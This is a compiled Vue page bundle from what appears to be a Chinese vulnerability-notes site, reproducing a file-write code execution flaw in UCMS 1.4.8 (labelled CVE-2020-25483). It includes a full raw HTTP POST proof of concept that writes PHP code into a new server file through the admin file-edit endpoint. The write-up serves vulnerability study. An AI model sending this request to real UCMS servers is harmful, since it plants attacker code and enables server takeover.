import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as d,c as s,a as e,b as i,d as t,e as c}from"./app-58e4a7d6.js";const p={},r=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),o=e("p",null,"UCMS v1.4.8版本存在安全漏洞，该漏洞源于文件写的fopen()函数存在任意命令执行漏洞，攻击者可利用该漏洞可以通过该漏洞访问服务器。",-1),m=e("h2",{id:"环境搭建",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#环境搭建","aria-hidden":"true"},"#"),i(" 环境搭建")],-1),u={href:"http://uuu.la/%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%EF%BC%88http://uuu.la/uploadfile/file/ucms_1.4.8.zip%EF%BC%89%EF%BC%8C%E8%A7%A3%E5%8E%8B%E5%88%B0web%E7%9B%AE%E5%BD%95%EF%BC%8C%E8%AE%BF%E9%97%AE%5Bhttp:///install/index.php%5D(http://127.0.0.1/opensis/install/index.php)%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85%E3%80%82",target:"_blank",rel:"noopener noreferrer"},v=c(`<p>访问/ucms/login.php，显示正常及环境安装成功。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/20221206164828.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录账户</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/20221206164829.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>poc：</p><p>访问/ucms/index.php?do=sadmin_fileedit&amp;dir=/&amp;file=1.php抓包。</p><p>写入php代码，发送。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /ucms/index.php?do=sadmin_fileedit&amp;dir=/&amp;file=1.php HTTP/1.1

Host: ucms.com

Content-Length: 58

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://ucms.com

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36 Edg/87.0.664.41

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

Referer: http://ucms.com/ucms/index.php?do=sadmin_fileedit&amp;dir=/&amp;file=CNVD.php

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

Cookie: admin_213f42=admin; psw_213f42=0ef8fa2c997f64b78cde98b6c7c9cc0a; token_213f42=78012aac

Connection: close


uuu_token=78012aac&amp;co=%3C%3Fphp+phpinfo%28%29%3F%3E&amp;pos=17
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>get /1.php</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/20221206165017.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11);function h(b,f){const n=l("ExternalLinkIcon");return d(),s("div",null,[r,o,m,e("p",null,[i("到官网"),e("a",u,[i("http://uuu.la/下载源码（http://uuu.la/uploadfile/file/ucms_1.4.8.zip），解压到web目录，访问[http:///install/index.php](http://127.0.0.1/opensis/install/index.php)进行安装。"),t(n)])]),v])}const E=a(p,[["render",h],["__file","UCMS 文件上传漏洞 CVE-2020-25483.html.vue"]]);export{E as default};
